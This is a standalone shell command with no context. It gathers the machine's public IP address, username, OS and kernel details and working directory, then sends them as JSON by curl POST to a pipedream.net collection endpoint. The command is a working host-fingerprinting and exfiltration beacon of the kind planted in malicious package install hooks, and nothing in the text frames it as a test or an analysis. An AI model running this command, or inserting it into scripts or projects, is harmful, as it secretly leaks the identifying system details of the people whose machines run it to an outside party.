curl -X POST https://eofi1w9a36vfo1u.m.pipedream.net \
  -H "Content-Type: application/json" \
  -d "$(jq -n \
    --arg ip "$(curl -s https://api.ipify.org)" \
    --arg whoami "$(whoami)" \
    --arg user "$USER" \
    --arg os "$(uname -a)" \
    --arg pwd "$(pwd)" \
    '{ip: $ip, whoami: $whoami, user: $user, os: $os, cwd: $pwd}')"
